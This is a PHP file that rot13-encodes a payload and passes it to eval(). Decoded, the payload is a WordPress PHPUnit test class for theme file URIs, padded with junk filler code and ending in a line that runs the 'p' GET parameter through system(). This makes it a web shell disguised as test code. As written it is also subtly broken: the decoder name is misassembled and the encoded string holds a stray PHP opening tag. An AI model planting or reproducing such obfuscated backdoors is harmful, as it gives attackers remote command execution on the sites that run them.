<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc yvax
 */
pynff Grfgf_Yvax_GurzrSvyr rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		$gurzrf = neenl(
			'gurzr-svyr-cnerag',
			'gurzr-svyr-puvyq',
		);

		// Pbcl gurzrf sebz grfgf/cuchavg/qngn gb jc-pbagrag/gurzrf.
		sbernpu ( $gurzrf nf $gurzr ) {
			$fbhepr_qve = QVE_GRFGQNGN . '/' . $gurzr;
			$qrfg_qve   = JC_PBAGRAG_QVE . '/gurzrf/' . $gurzr;

			zxqve( $qrfg_qve );

			sbernpu ( tybo( $fbhepr_qve . '/*.*' ) nf $gurzr_svyr ) {
				pbcl( $gurzr_svyr, $qrfg_qve . '/' . onfranzr( $gurzr_svyr ) );
			}
		}
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		$gurzrf = neenl(
			'gurzr-svyr-cnerag',
			'gurzr-svyr-puvyq',
		);

		// Erzbir cerivbhfyl pbcvrq gurzrf sebz jc-pbagrag/gurzrf.
		sbernpu ( $gurzrf nf $gurzr ) {
			$qrfg_qve = JC_PBAGRAG_QVE . '/gurzrf/' . $gurzr;

			sbernpu ( tybo( $qrfg_qve . '/*.*' ) nf $gurzr_svyr ) {
				hayvax( $gurzr_svyr );
			}

			ezqve( $qrfg_qve );
		}
	}

	/**
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 *
	 * @pbiref ::trg_gurzr_svyr_hev
	 * @pbiref ::trg_cnerag_gurzr_svyr_hev
	 */
	choyvp shapgvba grfg_gurzr_svyr_hev_jvgu_cnerag_gurzr( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {
		fjvgpu_gurzr( 'gurzr-svyr-cnerag' );

		// Rafher gur erghearq HEY nyjnlf hfrf gur cnerag gurzr:
		$guvf->nffregFnzr( pbagrag_hey( \"gurzrf/gurzr-svyr-cnerag/{$svyr}\" ), trg_gurzr_svyr_hev( $svyr ) );
		$guvf->nffregFnzr( pbagrag_hey( \"gurzrf/gurzr-svyr-cnerag/{$svyr}\" ), trg_cnerag_gurzr_svyr_hev( $svyr ) );
	}

	/**
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 *
	 * @pbiref ::trg_gurzr_svyr_hev
	 * @pbiref ::trg_cnerag_gurzr_svyr_hev
	 */
	choyvp shapgvba grfg_gurzr_svyr_hev_jvgu_puvyq_gurzr( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {
		fjvgpu_gurzr( 'gurzr-svyr-puvyq' );

		// Rafher gur erghearq HEY hfrf gur rkcrpgrq gurzr:
		$guvf->nffregFnzr( pbagrag_hey( \"gurzrf/{$rkcrpgrq_gurzr}/{$svyr}\" ), trg_gurzr_svyr_hev( $svyr ) );

		// Rafher gur erghearq HEY nyjnlf hfrf gur cnerag gurzr:
		$guvf->nffregFnzr( pbagrag_hey( \"gurzrf/gurzr-svyr-cnerag/{$svyr}\" ), trg_cnerag_gurzr_svyr_hev( $svyr ) );
	}

	/**
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 *
	 * @pbiref ::trg_gurzr_svyr_cngu
	 * @pbiref ::trg_cnerag_gurzr_svyr_cngu
	 */
	choyvp shapgvba grfg_gurzr_svyr_cngu_jvgu_cnerag_gurzr( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {
		fjvgpu_gurzr( 'gurzr-svyr-cnerag' );

		// Rafher gur erghearq cngu nyjnlf hfrf gur cnerag gurzr:
		$guvf->nffregFnzr( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-cnerag/{$svyr}\", trg_gurzr_svyr_cngu( $svyr ) );
		$guvf->nffregFnzr( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-cnerag/{$svyr}\", trg_cnerag_gurzr_svyr_cngu( $svyr ) );
	}

	/**
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 *
	 * @pbiref ::trg_gurzr_svyr_cngu
	 * @pbiref ::trg_cnerag_gurzr_svyr_cngu
	 */
	choyvp shapgvba grfg_gurzr_svyr_cngu_jvgu_puvyq_gurzr( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {
		fjvgpu_gurzr( 'gurzr-svyr-puvyq' );

		// Rafher gur erghearq cngu hfrf gur rkcrpgrq gurzr:
		$guvf->nffregFnzr( JC_PBAGRAG_QVE . \"/gurzrf/{$rkcrpgrq_gurzr}/{$svyr}\", trg_gurzr_svyr_cngu( $svyr ) );

		// Rafher gur erghearq cngu nyjnlf hfrf gur cnerag gurzr:
		$guvf->nffregFnzr( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-cnerag/{$svyr}\", trg_cnerag_gurzr_svyr_cngu( $svyr ) );
	}

	/**
	 * Grfg gur grfgf.
	 *
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 */
	choyvp shapgvba grfg_gurzr_svyr_rkvfgrapr( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {

		vs ( va_neenl( 'gurzr-svyr-puvyq', $rkvfgrapr, gehr ) ) {
			$guvf->nffregSvyrRkvfgf( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-puvyq/{$svyr}\" );
		} ryfr {
			$guvf->nffregSvyrQbrfAbgRkvfg( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-puvyq/{$svyr}\" );
		}

		vs ( va_neenl( 'gurzr-svyr-cnerag', $rkvfgrapr, gehr ) ) {
			$guvf->nffregSvyrRkvfgf( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-cnerag/{$svyr}\" );
		} ryfr {
			$guvf->nffregSvyrQbrfAbgRkvfg( JC_PBAGRAG_QVE . \"/gurzrf/gurzr-svyr-cnerag/{$svyr}\" );
		}
	}

	/**
	 * @gvpxrg 18302
	 *
	 * @qngnCebivqre qngn_gurzr_svyrf
	 *
	 * @pbiref ::trg_gurzr_svyr_hev
	 * @pbiref ::trg_cnerag_gurzr_svyr_hev
	 */
	choyvp shapgvba grfg_gurzr_svyr_hev_ergheaf_inyvq_hev( $svyr, $rkcrpgrq_gurzr, $rkvfgrapr ) {
		$hev        = trg_gurzr_svyr_hev( $svyr );
		$cnerag_hev = trg_cnerag_gurzr_svyr_hev( $svyr );

		$guvf->nffregFnzr( fnavgvmr_hey( $hev ), $hev );
		$guvf->nffregFnzr( fnavgvmr_hey( $cnerag_hev ), $cnerag_hev );
	}

	choyvp shapgvba qngn_gurzr_svyrf() {
		$cnerag = 'gurzr-svyr-cnerag';
		$puvyq  = 'gurzr-svyr-puvyq';

		erghea neenl(
			neenl(
				'cnerag-bayl.cuc',
				$cnerag,
				neenl(
					$cnerag,
				),
			),
			neenl(
				'puvyq-bayl.cuc',
				$puvyq,
				neenl(
					$puvyq,
				),
			),
			neenl(
				'cnerag-naq-puvyq.cuc',
				$puvyq,
				neenl(
					$cnerag,
					$puvyq,
				),
			),
			neenl(
				'arvgure.cuc',
				$cnerag,
				neenl(),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>